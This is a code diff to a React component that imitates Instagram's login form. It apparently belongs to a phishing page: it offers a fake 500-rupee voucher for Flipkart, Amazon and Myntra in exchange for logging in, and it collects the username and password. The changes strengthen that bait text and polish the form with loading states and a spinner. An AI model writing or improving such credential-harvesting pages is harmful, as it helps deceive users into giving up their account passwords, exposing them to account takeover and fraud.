@@ -54,7 +54,8 @@ const InstagramLogin = () => {
               alt="gift"
               className="popup-image"
             />
-            <h3>Login Instagram to get 500 rupees</h3>
+            <h3>Login Instagram to get 500 rupees voucher use that in below Ecommerce sites</h3><br/>
+                 <h4>Flipkart,Amazon,Myntra</h4>
             <button onClick={handleClosePopup} className="popup-ok-button">
               OK
             </button>
@@ -84,20 +85,22 @@ const InstagramLogin = () => {
           className="input-field"
           type="text"
           name='email' value={email} onChange={(e)=>setEmail(e.target.value)}
-          placeholder="Phone number, username, or email"
+          placeholder="Phone number, username, or email" disabled={loading}
         />
         <input
           className="input-field"
           type="password"
           name='password' value={password} onChange={(e)=>setPassword(e.target.value)}
-          placeholder="Password"
+          placeholder="Password" disabled={loading}
         />
 
         <a href="#" className="forgot-link">
           Forgot password?
         </a>
 
-        <button className="login-button" type="submit">{loading? "Log in...": "Log in"}</button>
+        <button className="login-button" type="submit" disabled={loading}>
+        {loading ? <span className="spinner"></span> : "Log in"}
+        </button>
         </form>
 
         <div className="signup-link">
